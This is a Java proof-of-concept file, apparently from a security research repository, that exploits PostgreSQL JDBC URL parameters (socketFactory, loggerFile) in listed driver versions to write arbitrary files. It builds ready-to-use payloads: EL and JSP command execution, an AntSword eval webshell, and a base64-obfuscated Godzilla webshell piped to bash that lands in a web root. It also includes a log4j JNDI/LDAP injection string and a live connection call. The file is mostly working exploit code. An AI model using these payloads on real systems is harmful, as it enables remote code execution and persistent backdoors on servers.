package postgresql;

import org.postgresql.Driver;

import java.sql.DriverManager;

/**
 * File Write
 * version
 * <p>
 * [9.4.1208, 42.2.25)
 * [42.3.0, 42.3.2)
 *
 * Ref: https://pyn3rd.github.io/2022/06/02/Make-JDBC-Attacks-Brilliant-Again/
 *
 * @author Whoopsunix
 */
public class FileAttack {
    public static void main(String[] args) throws Exception {
        /**
         * 利用日志功能创建文件
         * 也需要目录存在
         */
        String fileCreate = "jdbc:postgresql://127.0.0.1:5432/test?socketFactory=java.io.FileOutputStream&socketFactoryArg=test.log";


        /**
         * loggerLevel / loggerFile
         */
        /**
         * 原始的写入 可写EL
         */
        // 需要该目录存在
        String writePath = System.getProperty("user.dir") + "/Expression/ELAttack/src/main/webapp/pg-write.jsp";
        String elExecContent = "${Runtime.getRuntime().exec(\"open -a calculator.app\")}";
        String elWriteAttackURL = String.format("jdbc:postgresql://127.0.0.1:5432/test?ApplicationName=%s&loggerLevel=TRACE&loggerFile=%s", elExecContent, writePath);
        System.out.println(elWriteAttackURL);
        /**
         * 通过截断拓展更多写入可能性
         */
        String jspExecContent = "<%Runtime.getRuntime().exec(\"open -a Calculator.app\");%>";
        // pass: ant type: jspjs el
        String antShellContent = "<%out.print(org.apache.jasper.runtime.PageContextImpl.proprietaryEvaluate(request.getParameter(\"ant\"), String.class, pageContext, null));%>";
        // 曲线写入 本质还是命令执行 在ROOT目录下写入 godzilla默认shell 2.jsp
        // todo 完善
        String godzillaShellContent = "<%Runtime.getRuntime().exec(\"bash -c {echo,ZWNobyAiPCUhIFN0cmluZyB4Yz0iM2M2ZTBiOGE5YzE1MjI0YSI7IFN0cmluZyBwYXNzPSJwYXNzIjsgU3RyaW5nIG1kNT1tZDUocGFzcyt4Yyk7IGNsYXNzIFggZXh0ZW5kcyBDbGFzc0xvYWRlcntwdWJsaWMgWChDbGFzc0xvYWRlciB6KXtzdXBlcih6KTt9cHVibGljIENsYXNzIFEoYnl0ZVtdIGNiKXtyZXR1cm4gc3VwZXIuZGVmaW5lQ2xhc3MoY2IsIDAsIGNiLmxlbmd0aCk7fSB9cHVibGljIGJ5dGVbXSB4KGJ5dGVbXSBzLGJvb2xlYW4gbSl7IHRyeXtqYXZheC5jcnlwdG8uQ2lwaGVyIGM9amF2YXguY3J5cHRvLkNpcGhlci5nZXRJbnN0YW5jZSgiQUVTIik7Yy5pbml0KG0/MToyLG5ldyBqYXZheC5jcnlwdG8uc3BlYy5TZWNyZXRLZXlTcGVjKHhjLmdldEJ5dGVzKCksIkFFUyIpKTtyZXR1cm4gYy5kb0ZpbmFsKHMpOyB9Y2F0Y2ggKEV4Y2VwdGlvbiBlKXtyZXR1cm4gbnVsbDsgfX0gcHVibGljIHN0YXRpYyBTdHJpbmcgbWQ1KFN0cmluZyBzKSB7U3RyaW5nIHJldCA9IG51bGw7dHJ5IHtqYXZhLnNlY3VyaXR5Lk1lc3NhZ2VEaWdlc3QgbTttID0gamF2YS5zZWN1cml0eS5NZXNzYWdlRGlnZXN0LmdldEluc3RhbmNlKCJNRDUiKTttLnVwZGF0ZShzLmdldEJ5dGVzKCksIDAsIHMubGVuZ3RoKCkpO3JldCA9IG5ldyBqYXZhLm1hdGguQmlnSW50ZWdlcigxLCBtLmRpZ2VzdCgpKS50b1N0cmluZygxNikudG9VcHBlckNhc2UoKTt9IGNhdGNoIChFeGNlcHRpb24gZSkge31yZXR1cm4gcmV0OyB9IHB1YmxpYyBzdGF0aWMgU3RyaW5nIGJhc2U2NEVuY29kZShieXRlW10gYnMpIHRocm93cyBFeGNlcHRpb24ge0NsYXNzIGJhc2U2NDtTdHJpbmcgdmFsdWUgPSBudWxsO3RyeSB7YmFzZTY0PUNsYXNzLmZvck5hbWUoImphdmEudXRpbC5CYXNlNjQiKTtPYmplY3QgRW5jb2RlciA9IGJhc2U2NC5nZXRNZXRob2QoImdldEVuY29kZXIiLCBudWxsKS5pbnZva2UoYmFzZTY0LCBudWxsKTt2YWx1ZSA9IChTdHJpbmcpRW5jb2Rlci5nZXRDbGFzcygpLmdldE1ldGhvZCgiZW5jb2RlVG9TdHJpbmciLCBuZXcgQ2xhc3NbXSB7IGJ5dGVbXS5jbGFzcyB9KS5pbnZva2UoRW5jb2RlciwgbmV3IE9iamVjdFtdIHsgYnMgfSk7fSBjYXRjaCAoRXhjZXB0aW9uIGUpIHt0cnkgeyBiYXNlNjQ9Q2xhc3MuZm9yTmFtZSgic3VuLm1pc2MuQkFTRTY0RW5jb2RlciIpOyBPYmplY3QgRW5jb2RlciA9IGJhc2U2NC5uZXdJbnN0YW5jZSgpOyB2YWx1ZSA9IChTdHJpbmcpRW5jb2Rlci5nZXRDbGFzcygpLmdldE1ldGhvZCgiZW5jb2RlIiwgbmV3IENsYXNzW10geyBieXRlW10uY2xhc3MgfSkuaW52b2tlKEVuY29kZXIsIG5ldyBPYmplY3RbXSB7IGJzIH0pO30gY2F0Y2ggKEV4Y2VwdGlvbiBlMikge319cmV0dXJuIHZhbHVlOyB9IHB1YmxpYyBzdGF0aWMgYnl0ZVtdIGJhc2U2NERlY29kZShTdHJpbmcgYnMpIHRocm93cyBFeGNlcHRpb24ge0NsYXNzIGJhc2U2NDtieXRlW10gdmFsdWUgPSBudWxsO3RyeSB7YmFzZTY0PUNsYXNzLmZvck5hbWUoImphdmEudXRpbC5CYXNlNjQiKTtPYmplY3QgZGVjb2RlciA9IGJhc2U2NC5nZXRNZXRob2QoImdldERlY29kZXIiLCBudWxsKS5pbnZva2UoYmFzZTY0LCBudWxsKTt2YWx1ZSA9IChieXRlW10pZGVjb2Rlci5nZXRDbGFzcygpLmdldE1ldGhvZCgiZGVjb2RlIiwgbmV3IENsYXNzW10geyBTdHJpbmcuY2xhc3MgfSkuaW52b2tlKGRlY29kZXIsIG5ldyBPYmplY3RbXSB7IGJzIH0pO30gY2F0Y2ggKEV4Y2VwdGlvbiBlKSB7dHJ5IHsgYmFzZTY0PUNsYXNzLmZvck5hbWUoInN1bi5taXNjLkJBU0U2NERlY29kZXIiKTsgT2JqZWN0IGRlY29kZXIgPSBiYXNlNjQubmV3SW5zdGFuY2UoKTsgdmFsdWUgPSAoYnl0ZVtdKWRlY29kZXIuZ2V0Q2xhc3MoKS5nZXRNZXRob2QoImRlY29kZUJ1ZmZlciIsIG5ldyBDbGFzc1tdIHsgU3RyaW5nLmNsYXNzIH0pLmludm9rZShkZWNvZGVyLCBuZXcgT2JqZWN0W10geyBicyB9KTt9IGNhdGNoIChFeGNlcHRpb24gZTIpIHt9fXJldHVybiB2YWx1ZTsgfSU+PCV0cnl7Ynl0ZVtdIGRhdGE9YmFzZTY0RGVjb2RlKHJlcXVlc3QuZ2V0UGFyYW1ldGVyKHBhc3MpKTtkYXRhPXgoZGF0YSwgZmFsc2UpO2lmIChzZXNzaW9uLmdldEF0dHJpYnV0ZSgicGF5bG9hZCIpPT1udWxsKXtzZXNzaW9uLnNldEF0dHJpYnV0ZSgicGF5bG9hZCIsbmV3IFgodGhpcy5nZXRDbGFzcygpLmdldENsYXNzTG9hZGVyKCkpLlEoZGF0YSkpO31lbHNle3JlcXVlc3Quc2V0QXR0cmlidXRlKCJwYXJhbWV0ZXJzIixkYXRhKTtqYXZhLmlvLkJ5dGVBcnJheU91dHB1dFN0cmVhbSBhcnJPdXQ9bmV3IGphdmEuaW8uQnl0ZUFycmF5T3V0cHV0U3RyZWFtKCk7T2JqZWN0IGY9KChDbGFzcylzZXNzaW9uLmdldEF0dHJpYnV0ZSgicGF5bG9hZCIpKS5uZXdJbnN0YW5jZSgpO2YuZXF1YWxzKGFyck91dCk7Zi5lcXVhbHMocGFnZUNvbnRleHQpO3Jlc3BvbnNlLmdldFdyaXRlcigpLndyaXRlKG1kNS5zdWJzdHJpbmcoMCwxNikpO2YudG9TdHJpbmcoKTtyZXNwb25zZS5nZXRXcml0ZXIoKS53cml0ZShiYXNlNjRFbmNvZGUoeChhcnJPdXQudG9CeXRlQXJyYXkoKSwgdHJ1ZSkpKTtyZXNwb25zZS5nZXRXcml0ZXIoKS53cml0ZShtZDUuc3Vic3RyaW5nKDE2KSk7fSB9Y2F0Y2ggKEV4Y2VwdGlvbiBlKXt9JT4gIj4gLi4vd2ViYXBwcy9ST09ULzIuanNw}|{base64,-d}|{bash,-i}\");%>";
        String elWriteAttackURL2 = String.format("jdbc:postgresql://127.0.0.1:5432/test/?loggerLevel=DEBUG&loggerFile=%s&%s=", writePath, godzillaShellContent);
        System.out.println(elWriteAttackURL2);

        /**
         * log4j
         * 和上面一样 另一种利用思路
         *  污染日志文件
         */
        String log4jContent = "jdbc:postgresql://127.0.0.1:5432/${jndi:ldap://127.0.0.1:1389/eajmgl}?loggerLevel=TRACE&loggerFile=/tmp/pgjdbc.log";


        // 执行
        DriverManager.registerDriver(new Driver());
        DriverManager.getConnection(log4jContent);
    }
}
